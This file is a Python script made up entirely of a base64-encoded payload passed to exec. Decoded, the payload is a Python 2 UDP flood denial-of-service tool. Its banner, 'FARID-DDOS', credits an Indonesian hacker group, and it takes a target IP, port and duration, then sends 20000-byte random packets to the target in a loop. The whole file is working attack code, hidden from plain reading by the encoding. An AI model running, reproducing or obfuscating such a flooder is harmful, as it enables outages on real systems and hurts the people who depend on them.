import base64
exec(base64.b64decode('aW1wb3J0IHRpbWUKaW1wb3J0IHNvY2tldAppbXBvcnQgcmFuZG9tCmltcG9ydCBzeXMKZGVmIHVzYWdlKCk6CiAgICBwcmludCAiXDAzM1sxOzMybSMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyIKICAgIHByaW50ICIjLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS1bXDAzM1sxOzkxbUZBUklELURET1NcMDMzWzE7MzJtXS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tIyIKICAgIHByaW50ICIjLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLSMiCiAgICBwcmludCAiIyAgIFwwMzNbMTs5MW1Db21tYW5kOiAiICJweXRob24yIFRhbWZhbkRkb3MucHkgIiAiPGlwPiA8cG9ydD4gPHBhY2tldD4gXDAzM1sxOzMybSAjIgogICAgcHJpbnQgIiMgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICMjIgogICAgcHJpbnQgIiNcMDMzWzE7OTFtQ3JlYXRvcjpNUi5GNFIxRCAgXDAzM1sxOzMybSMjICAgICAgIyAgICAgICMgICAgICAgICAgICAgICAgICAgICAjIyIKICAgIHByaW50ICIjXDAzM1sxOzkxbVRlYW0gICA6IE1DSSAgICAgICAgXDAzM1sxOzMybSMjICAgICAjICAgICAgIyAgICAgICAgICAgICAgICAgICAgICMjIgogICAgcHJpbnQgIiNcMDMzWzE7OTFtVmVyc2lvbjoxLjAgICAgICAgIFwwMzNbMTszMm0jIyAgICAgICMgICAgICAjICAgICAgICAgICAgICAgICAgICAgIyMiCiAgICBwcmludCAiI1wwMzNbMTs5MW1UUUFkbWluOk1SLkY0UjFEWC1NclJhcGhhZWwtTXJUaGVTcGFtLU1yLkRjLU1yQmxhY2tIYXQgICMjIgogICAgcHJpbnQgIiNcMDMzWzE7OTFtICAgICAgIDpMaWtlV2hpdGUtTXJVa25vd24tTXJTYW5jaGV6LU1yQmltYm9uZy1NclRhbWZhbiAjIyIKICAgIHByaW50ICIjICAgICAgICAgICAgICAgICAgICAgXDAzM1sxOzkxbSAjIyAgICAgXDAzM1sxOzMybSMgIFwwMzNbMTs5MW0gIFwwMzNbMTszMiAgICMjIgogICAgcHJpbnQgIiMgICAgICAgICAgICAgICAgICAgICBcMDMzWzE7OTFtIyMgIFwwMzNbMTszMm0jIyMgICBcMDMzWzE7OTFtICBcMDMzWzE7MzJtICAgIyMiCiAgICBwcmludCAiIyAgICAgICAgICAgICAgIFwwMzNbMTs5MW08LS1bTVVTTElNIENZQkVSIElORE9ORVNJQV0tLT4gICAgICAgICBcMDMzWzE7MzJtICAjIyIKICAgIHByaW50ICIjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMiCiAgICBwcmludCAiICAgICBNZW1iZXI6TXIuWmVlWF9JTkQtSy5SLkEuUy1FZWxlaElORC1XaG9BbUktV2V5dC5UbSIKICAgIHByaW50ICIgICAgICAgICAgIFBlbWJ1YXREZG9zMTpNUi5GNFIxRDE5ODcgQ3liZXIgVGVhbSIKICAgIHByaW50ICIgICAgICAgICAgUGVtYnVhdERkb3MyOk11c2xpbSBDeWJlciBJbmRvbmVzaWEiCmRlZiBmbG9vZCh2aWN0aW0sIHZwb3J0LCBkdXJhdGlvbik6CiAgICAjIFN1cHBvcnQgdXMgeWFha2suLi4gOikKICAgICMgT2tleSBKYWRpIGRpc2luaSBzYXlhIG1lbWJ1YXQgc2VydmVyLCBLZXRpa2Egc2F5YSBtZW1hbmdnaWwgIlNPQ0tfREdSQU0iIGl0dSAgbWVudW5qdWtrYW4gIFVEUCB0eXBlIHByb2dyYW0KICAgIGNsaWVudCA9IHNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQsIHNvY2tldC5TT0NLX0RHUkFNKQogICAgIyAyMDAwMCByZXByZXNlbnRhc2kgc2F0dSBieXRlIGtlIHNlcnZlcgogICAgYnl0ZXMgPSByYW5kb20uX3VyYW5kb20oMjAwMDApCiAgICB0aW1lb3V0ID0gIHRpbWUudGltZSgpICsgZHVyYXRpb24KICAgIHNlbnQgPSAzMDAwCgogICAgd2hpbGUgMToKICAgICAgICBpZiB0aW1lLnRpbWUoKSA+IHRpbWVvdXQ6CiAgICAgICAgICAgIGJyZWFrCiAgICAgICAgZWxzZToKICAgICAgICAgICAgcGFzcwogICAgICAgIGNsaWVudC5zZW5kdG8oYnl0ZXMsICh2aWN0aW0sIHZwb3J0KSkKICAgICAgICBzZW50ID0gc2VudCArIDEKICAgICAgICBwcmludCAiXDAzM1sxOzkxbU1lbXVsYWkgXDAzM1sxOzMybSVzIFwwMzNbMTs5MW1tZW5naXJpbSBwYWtldCBcMDMzWzE7MzJtJXMgXDAzM1sxOzkxbXBhZGEgcG9ydCBcMDMzWzE7MzJtJXMgIiUoc2VudCwgdmljdGltLCB2cG9ydCkKZGVmIG1haW4oKToKICAgIHByaW50IGxlbihzeXMuYXJndikKICAgIGlmIGxlbihzeXMuYXJndikgIT0gNDoKICAgICAgICB1c2FnZSgpCiAgICBlbHNlOgogICAgICAgIGZsb29kKHN5cy5hcmd2WzFdLCBpbnQoc3lzLmFyZ3ZbMl0pLCBpbnQoc3lzLmFyZ3ZbM10pKQoKaWYgX19uYW1lX18gPT0gJ19fbWFpbl9fJzoKICAgIG1haW4oKQoK'))